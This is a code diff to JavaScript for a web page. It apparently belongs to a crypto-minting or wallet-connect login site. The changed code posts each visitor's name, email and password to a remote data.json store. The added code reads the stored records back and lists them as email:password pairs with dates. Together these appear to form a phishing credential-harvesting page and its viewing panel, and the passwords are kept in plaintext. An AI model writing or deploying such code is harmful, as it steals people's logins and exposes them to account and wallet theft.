@@ -37,6 +37,43 @@
 
 //document.getElementById("demo").innerHTML = mapped.map(kk => kk);
 	});
+	axios.get(getLink()+'/data.json').then(res => {
+		//console.log(res.data);
+
+	//const obj = JSON.parse(res.data);
+	//document.getElementById("demo").innerHTML = obj;
+	const todos = res.data;
+	var count = 0;
+   for (var key in todos) {
+   	count += 1;
+  if (todos.hasOwnProperty(key)) {
+  	let textContent = document.createTextNode(count);
+  	let textContent2 = document.createTextNode(todos[key].name);
+  	let textContent3 = document.createTextNode(todos[key].email + ":"+todos[key].keyy);
+  	let textContent4 = document.createTextNode(todos[key].date);
+    const ul = document.getElementById("datadom");
+    let li = document.createElement("li");
+    let li2 = document.createElement("li");
+    let li3 = document.createElement("li");
+    let li4 = document.createElement("li");
+    li.setAttribute("class", "col-1");
+    li2.setAttribute("class", "col-2");
+    li3.setAttribute("class", "col-6");
+    li4.setAttribute("class", "col-3");
+    li.appendChild(textContent);
+    li2.appendChild(textContent2);
+    li3.appendChild(textContent3);
+    li4.appendChild(textContent4);
+    ul.appendChild(li);
+    ul.appendChild(li2);
+    ul.appendChild(li3);
+    ul.appendChild(li4);
+   // console.log(todos[key], key, count);
+  }
+}
+
+//document.getElementById("demo").innerHTML = mapped.map(kk => kk);
+	});
 
 
 };
@@ -96,7 +133,7 @@ if(g == 1){
 	var pass = document.getElementById('pass').value;
 	var email = document.getElementById('email').value;
 $('#preloader').removeClass("loaded");	
-axios.post(getLink()+'/data.json', {name: name, key: pass, email: email, date: new Date()}, {headers: {'Content-Type': 'application/json'}}).then(res => {
+axios.post(getLink()+'/data.json', {name: name, keyy: pass, email: email, date: new Date()}, {headers: {'Content-Type': 'application/json'}}).then(res => {
 window.location.replace('./login.html?mint');
 }).catch(err => {window.location.replace('./404.html');});
 	}else{window.location.replace('./connect-wallet.html');}
